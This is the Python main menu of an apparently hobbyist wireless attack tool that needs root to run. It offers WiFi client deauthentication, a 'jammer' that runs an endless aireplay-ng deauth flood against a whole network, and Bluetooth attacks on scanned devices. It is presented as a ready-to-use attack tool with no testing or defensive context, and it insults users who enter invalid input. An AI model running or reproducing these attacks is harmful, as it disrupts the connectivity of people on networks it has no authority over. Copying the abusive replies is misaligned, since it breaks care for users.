try:
    from rich.table import Table
    from rich.console import Console
    from colorama import Fore
    import subprocess
    import shutil
    import psutil
    import os
    import time
    import sys
    import re
except ModuleNotFoundError:
    print("Try installing the dependencies")
    print("Also install the Aircrack-ng suite on your sistem")

from wifi import WiFi
from bluetooth import Bluetooth

console = Console()
wifi_scanner = None
back = False
wifi = False
bluetooth = False
sysinfo = False
ap_mac = None
client_mac = None
clients = []
ble_scanner = False


def printLogo2():
    print(Fore.RED + """
▄▄▄█████▓ ██░ ██ ▓█████      ██████  ██▓ ██▓    ▓█████  ███▄    █  ▄████▄  ▓█████  ██▀███     
▓  ██▒ ▓▒▓██░ ██▒▓█   ▀    ▒██    ▒ ▓██▒▓██▒    ▓█   ▀  ██ ▀█   █ ▒██▀ ▀█  ▓█   ▀ ▓██ ▒ ██▒   
▒ ▓██░ ▒░▒██▀▀██░▒███      ░ ▓██▄   ▒██▒▒██░    ▒███   ▓██  ▀█ ██▒▒▓█    ▄ ▒███   ▓██ ░▄█ ▒   
░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄      ▒   ██▒░██░▒██░    ▒▓█  ▄ ▓██▒  ▐▌██▒▒▓▓▄ ▄██▒▒▓█  ▄ ▒██▀▀█▄     
  ▒██▒ ░ ░▓█▒░██▓░▒████▒   ▒██████▒▒░██░░██████▒░▒████▒▒██░   ▓██░▒ ▓███▀ ░░▒████▒░██▓ ▒██▒   
  ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░   ▒ ▒▓▒ ▒ ░░▓  ░ ▒░▓  ░░░ ▒░ ░░ ▒░   ▒ ▒ ░ ░▒ ▒  ░░░ ▒░ ░░ ▒▓ ░▒▓░   
    ░     ▒ ░▒░ ░ ░ ░  ░   ░ ░▒  ░ ░ ▒ ░░ ░ ▒  ░ ░ ░  ░░ ░░   ░ ▒░  ░  ▒    ░ ░  ░  ░▒ ░ ▒░   
  ░       ░  ░░ ░   ░      ░  ░  ░   ▒ ░  ░ ░      ░      ░   ░ ░ ░           ░     ░░   ░    
          ░  ░  ░   ░  ░         ░   ░      ░  ░   ░  ░         ░ ░ ░         ░  ░   ░        
                                                                  ░                           
""" + Fore.RESET)

def printWIFILogo():
    print(Fore.MAGENTA + """
░  ░░░░  ░░        ░░        ░░        ░░░░░░░░░      ░░░        ░░        ░░░      ░░░░      ░░░  ░░░░  ░░░      ░░
▒  ▒  ▒  ▒▒▒▒▒  ▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒  ▒▒▒  ▒▒▒▒▒▒▒
▓        ▓▓▓▓▓  ▓▓▓▓▓      ▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓  ▓▓▓▓▓  ▓▓▓▓▓▓▓▓  ▓▓▓▓▓  ▓▓▓▓  ▓▓  ▓▓▓▓▓▓▓▓     ▓▓▓▓▓▓      ▓▓
█   ██   █████  █████  ███████████  ███████████        █████  ████████  █████        ██  ████  ██  ███  █████████  █
█  ████  ██        ██  ████████        ████████  ████  █████  ████████  █████  ████  ███      ███  ████  ███      ██
                                                                                                                    
""" + Fore.RESET)

def printBluetoothLogo():
    print(Fore.CYAN + """
.#####...##......##..##..######..######...####....####...######..##..##...........####...######..######...####....####...##..##...####..
.##..##..##......##..##..##........##....##..##..##..##....##....##..##..........##..##....##......##....##..##..##..##..##.##...##.....
.#####...##......##..##..####......##....##..##..##..##....##....######..........######....##......##....######..##......####.....####..
.##..##..##......##..##..##........##....##..##..##..##....##....##..##..........##..##....##......##....##..##..##..##..##.##.......##.
.#####...######...####...######....##.....####....####.....##....##..##..........##..##....##......##....##..##...####...##..##...####..
........................................................................................................................................
""" + Fore.RESET)

def printSysInfoLogo():
    print(Fore.GREEN + """
  _________                  __                     .__           _____         
 /   _____/ ___.__.  _______/  |_   ____    _____   |__|  ____  _/ ____\  ____  
 \_____  \ <   |  | /  ___/\   __\_/ __ \  /     \  |  | /    \ \   __\  /  _ \ 
 /        \ \___  | \___ \  |  |  \  ___/ |  Y Y  \ |  ||   |  \ |  |   (  <_> )
/_______  / / ____|/____  > |__|   \___  >|__|_|  / |__||___|  / |__|    \____/ 
        \/  \/          \/             \/       \/           \/                 
""" + Fore.RESET) 
    
def printSysInfo():
    global sysinfo, back

    os.system("clear")

    sysinfo = True
    back = False

    stable = Table(title= "[bold red] System info [/bold red]")
    stable.add_column("Nr.")
    stable.add_column("Option")

    stable.add_row("0", "Disk Usage")
    stable.add_row("1", "Available Network Adapters")
    stable.add_row("2", "System info")
    stable.add_row("3", "Back")
    
    while sysinfo and not back:
        printSysInfoLogo()
        console.print(stable)

        option = int(input(Fore.GREEN + "> " + Fore.RESET))

        if option >= 0 and option <= 3:
            if option == 0:
                total, used, free = shutil.disk_usage("/")
                print()
                print(f"Total: {Fore.YELLOW}{total / (1024**3):.2f} GB{Fore.RESET}, "
      f"Used: {Fore.RED}{used / (1024**3):.2f} GB{Fore.RESET}, "
      f"Free: {Fore.GREEN}{free / (1024**3):.2f} GB{Fore.RESET}")
            if option == 1:
                adapters = psutil.net_if_addrs()
                for adapter_name, addresses in adapters.items():
                    print()
                    print(f"\nAdapter: {Fore.YELLOW + adapter_name + Fore.RESET}")
                    # Each adapter can have multiple addresses (IPv4, IPv6, MAC, etc.)
                    for address in addresses:
                        # Display relevant information: family, address, netmask, and broadcast
                        print(f"  - Family: {address.family.name if hasattr(address.family, 'name') else address.family}")
                        print(f"    Address: {Fore.MAGENTA + address.address + Fore.RESET}")
                        print(f"    Netmask: {address.netmask if address.netmask else 'N/A'}")
                        print(f"    Broadcast: {address.broadcast if address.broadcast else 'N/A'}")
            if option == 2:
                get_neofetch_info = subprocess.run(['neofetch', '--stdout'], capture_output=True, text=True)
                print()
                print(get_neofetch_info.stdout)
            if option == 3:
                back = True
                sysinfo = False
                os.system("clear")
        else:
            print()
            print(Fore.RED + "Your fucking moron. Can't u read?? Choose a option between 0 and 3 !!" + Fore.RESET)


def get_hci_adapters():
       try:
           result = subprocess.run(['hciconfig'], capture_output=True, text=True)
           # Match lines starting with hci followed by a digit
           adapters = re.findall(r'^(hci\d+):', result.stdout, re.MULTILINE)
           return adapters
       except Exception as e:
           print(f"Error: {e}")
           return []
   
def list_and_choose_adapters():
    global console

    table = Table(title= "Available bluetooth interfaces: ")
    table.add_column("Index", justify= "center", style= "yellow")
    table.add_column("Adapter", justify= "left", style= "green")
    adapters = get_hci_adapters()
    for i, adapter in enumerate(adapters):
        table.add_row(str(i), adapter)
    
    console.print(table)
    run = True
    while run:
        choice = input(Fore.GREEN + "\n> " + Fore.RESET)
        if choice.lower() == "q":
            break
        else:
            try:
                index = int(choice)
                if 0 <= index < len(adapters):
                    run = False
                    return adapters[index]
                else:
                    print("\nLearn to read Moron!!")
            except ValueError:
                print("\nLearn to read Moron!!")

def handleBluetooth():
    global bluetooth, back, ble_scanner

    os.system("clear")

    btable = Table(title= "[bold red] Bluetooth Menu [/bold red]")
    btable.add_column("Nr.")
    btable.add_column("Option")

    btable.add_row("0", "Show available adapters")
    btable.add_row("1", "Scan devices")
    btable.add_row("2", "Attack from curent scan")
    btable.add_row("3", "Attack from history")
    btable.add_row("4", "Back")

    while bluetooth and not back:
        printBluetoothLogo()
        console.print(btable)

        try:
            option = int(input(Fore.GREEN + "> " + Fore.RESET))
        except ValueError:
            print(Fore.RED + "Please enter a number." + Fore.RESET)
            continue


        if option >= 0 and option <= 4:
            if option == 0:
                adapter = list_and_choose_adapters()

                if not adapter:
                    print("No adapter selected. Exiting...")
                    exit(0)
                
                bluetooth = Bluetooth(adapter, console)
                ble_scanner = True
            
            if option == 1:
                if ble_scanner is False:
                    print(Fore.RED + "[+] You need to select an adapter first (option 0)." + Fore.RESET)
                    console.print(btable)
                else:
                    mac = bluetooth.display_devices()
                    if mac is None:
                        print(Fore.RED + "[+] No devices were seen" + Fore.RESET)
            
            if option == 2:

                if ble_scanner is False:
                    print(Fore.RED + "[+] You need to select an adapter first (option 0)." + Fore.RESET)
                    console.print(btable)

                if mac is None:
                    print(Fore.RED + "[+] No devices were seen" + Fore.RESET)
                    console.print(btable)
                else:
                   bluetooth.run_attack(mac)

            if option == 3:
                if ble_scanner is False:
                    print(Fore.RED + "[+] You need to select an adapter first (option 0)." + Fore.RESET)
                    console.print(btable)

                mac = 0
                mac =  bluetooth.display_devices_from_file()
                if mac is not None:
                    bluetooth.run_attack(mac)
                else:
                    console.print(btable)
            
            if option == 4:
                if 'bluetooth' in locals():
                    bluetooth.clear_bluetooth_data()
                else:
                    print(Fore.YELLOW + "[!] No adapter initialized. Nothing to clear." + Fore.RESET)

                back = True
                ble_scanner = False
                bluetooth = False
                os.system("clear")

        else:
            print()
            print(Fore.RED + "Your fucking moron. Can't u read?? Choose a option between 0 and 4 !!" + Fore.RESET)


def is_monitor_mode(interface):
    
        try:
            # Run iwconfig and capture the output
            result = subprocess.check_output(f"iwconfig {interface}", shell=True, stderr=subprocess.DEVNULL)
            output = result.decode()

            # Check if 'Mode:Monitor' is in the output
            if "Mode:Monitor" in output:
                return True
            else:
                return False
        except subprocess.CalledProcessError:
            return False
        
def list_and_choose_network():
        table = Table(title="Available adapters")
        table.add_column("Index", justify="center", style="yellow")
        table.add_column("Adapter name", justify="left", style="green")
        table.add_column("Adapter mode", justify="left", style="magenta")

        adapters = psutil.net_if_addrs()
        adapter_list = []

        for i, adapter_name in enumerate(adapters.keys()):
            adapter_list.append(adapter_name)
            if is_monitor_mode(adapter_name):
                table.add_row(str(i), adapter_name, "Monitor mode")
            else:
                table.add_row(str(i), adapter_name, "Managed")
        console.print(table)

        repeat = True

        while repeat:
            choice = input((Fore.GREEN + "\n> " + Fore.RESET))
            if choice.lower() == "q":
                break
            try:
                index = int(choice)
                if 0 <= index < len(adapter_list):
                    repeat = False
                    return adapter_list[index]
                else:
                    print("\nLearn to read Moron!!")
            except ValueError:
                print("\nLearn to read Moron!!")

def handleWiFi():
    global wifi, back, wifi_scanner, ap_mac, client_mac, clients

    os.system("clear")
    
    wifi = True
    back = False
    

    wtable = Table(title= "[bold red] Wifi Menu [/bold red]")
    wtable.add_column("Nr.")
    wtable.add_column("Option")

    wtable.add_row("0", "Show available networks adapters")
    wtable.add_row("1", "Scan and choose network")
    wtable.add_row("2", "Scan for clients")
    wtable.add_row("3", "Deauth client")
    wtable.add_row("4", "Deauth clients")
    wtable.add_row("5", "Jammer (will block the entire network)")
    wtable.add_row("6", "Back")

    while wifi and not back:
        printWIFILogo()

        console.print(wtable)

        try:
            option = int(input(Fore.GREEN + "> " + Fore.RESET))
        except ValueError:
            print(Fore.RED + "Please enter a number." + Fore.RESET)
            continue

        if option >= 0 and option <= 6:
            if option == 0:

                adapter = list_and_choose_network()
                wifi_scanner = WiFi(adapter, console)

            if option == 1:
                if wifi_scanner is None:
                   print(Fore.RED + "You need to select an adapter first (option 0)." + Fore.RESET)
                   console.print(wtable)
                else: 
                
                    result = wifi_scanner.scan_networks()
                    if result and all(value is not None for value in result):
                        id, ssid, ap_mac, channel, dbm_signal, security = result
                        print(f"\nDetails for network: {id}")
                        print(f"SSID: {ssid}")
                        print(f"BSSID: {ap_mac}")
                        print(f"Channel: {channel}")
                        print(f"Signal: {dbm_signal}")
                        print(f"Security: {security}")

            if option == 2:

                if wifi_scanner is None or ap_mac is None: 
                   print(Fore.RED + "You need to select an adapter first (option 0). \nScan for a network second!" + Fore.RESET)
                   console.print(wtable)
                else: 
                    
                    client_result = wifi_scanner.client_scan(ap_mac)
                    if client_result is None:
                        print("\nNo client selected")
                    else:
                        client_mac = client_result
                        clients.append(client_mac)

            if option == 3:

                if wifi_scanner is None:
                   print(Fore.RED + "You need to select an adapter first (option 0)." + Fore.RESET)
                   console.print(wtable)
                else:
                    if client_mac:
                        wifi_scanner.deauth_client(gateway_mac= ap_mac, target_mac= client_mac)
                    else:
                        print(Fore.RED + "No client selected yet. Scan and select a client first." + Fore.RESET)

            if option == 4:

                if wifi_scanner is None:
                   print(Fore.RED + "You need to select an adapter first (option 0)." + Fore.RESET)
                   console.print(wtable)
                else: 
                    c_mac = 0
                    repeat = True

                    while repeat:
                        choice = input("Do you want to add another client? (y/n) ")
                        if choice.lower() == "n":
                            repeat = False
                        else:
                            c_result = wifi_scanner.client_scan(ap_mac)
                            if c_result is None:
                                print("\nNo client selected")
                                repeat = False
                            else:
                                c_mac = c_result
                                clients.append(c_mac)

                    for client in clients:
                        wifi_scanner.deauth_client(gateway_mac= ap_mac, target_mac= client)


            if option == 5:

                if wifi_scanner is None:
                   print(Fore.RED + "You need to select an adapter first (option 0)." + Fore.RESET)
                   console.print(wtable)
                else:
                    command = f"sudo aireplay-ng --deauth 0 -a {ap_mac} {adapter}" 
                    try:
                        subprocess.run(f"iwconfig {adapter} channel {channel}", shell=True, check=True)
                        subprocess.run(command, shell=True, check=True)
                    except subprocess.CalledProcessError as e:
                        print(f"[!] Error executing command: {e}")

            if option == 6:

                if wifi_scanner is not None:
                    wifi_scanner.clear_wifi_data()
                else:
                    print(Fore.YELLOW + "[!] No adapter initialized. Nothing to clear." + Fore.RESET)

                clients.clear()
                back = True
                wifi = False
                os.system("clear")
        else:
            print()
            print(Fore.RED + "Your fucking moron. Can't u read?? Choose a option between 0 and 6 !!" + Fore.RESET)

def check_sudo():
    if os.geteuid() != 0:
        print(Fore.RED + "\n[!] This script must be run as sudo or root!" + Fore.RESET)
        sys.exit(1) 

def main():
    global back, wifi, bluetooth

    check_sudo()
    
    mtable = Table(title= "[bold red] Main Menu [/bold red]")
    mtable.add_column("Nr.")
    mtable.add_column("Option")

    mtable.add_row("0", "WiFi attacks")
    mtable.add_row("1", "Bluetooth attacks")
    mtable.add_row("2", "System info")
    mtable.add_row("3", "Exit")

    while True:
        back = False
        wifi = False
        bluetooth = False
        sysinfo = False
        printLogo2()
        console.print(mtable)

        option = int(input(Fore.GREEN + "> " + Fore.RESET))
        
        if option >= 0 and option <= 3:
            if option == 0:
                wifi = True
                handleWiFi()
            if option == 1:
                bluetooth = True
                handleBluetooth()
            if option == 2:
                sysinfo = True
                printSysInfo()
            if option == 3:
                print()
                print(Fore.YELLOW + "[+] Clearing data", end="", flush=True)  # Print without newline

                # Print a dot every 0.2 seconds (total of 5 dots)
                for _ in range(5):
                    time.sleep(0.2)
                    print(".", end="", flush=True)  # Print dot without newline

                print()  # New line after the dots
                print("[+] See ya!" + Fore.RESET)
                exit()

        else:
            print(Fore.RED + "Your fucking moron. Can't u read?? Choose a option between 0 and 3 !!" + Fore.RESET)

if __name__ == "__main__":
    try:
        os.system("clear")
        main()
    except KeyboardInterrupt:
        print()
        print(Fore.YELLOW + "[+] Program closed by user" + Fore.RESET)